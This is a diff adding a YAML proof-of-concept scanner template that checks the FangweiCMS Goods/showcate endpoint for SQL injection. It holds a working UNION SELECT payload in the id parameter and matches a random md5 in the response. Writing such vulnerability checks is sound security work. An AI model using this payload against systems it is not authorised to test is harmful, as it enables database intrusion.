@@ -1,0 +1,22 @@
+id: poc-yaml-fangweicms-sqli
+info:
+  name: Fangweicms SQL注入漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: Fangweicms
+  reference: []
+  description: null
+variables:
+  rand: random_int(10000, 21000)
+transport: http
+requests:
+- method: GET
+  path: /index.php?m=Goods&a=showcate&id=103%20UNION%20ALL%20SELECT%20CONCAT%28md5({{.rand}})%29%23
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: contains(body, md5(rand))
+  output: []
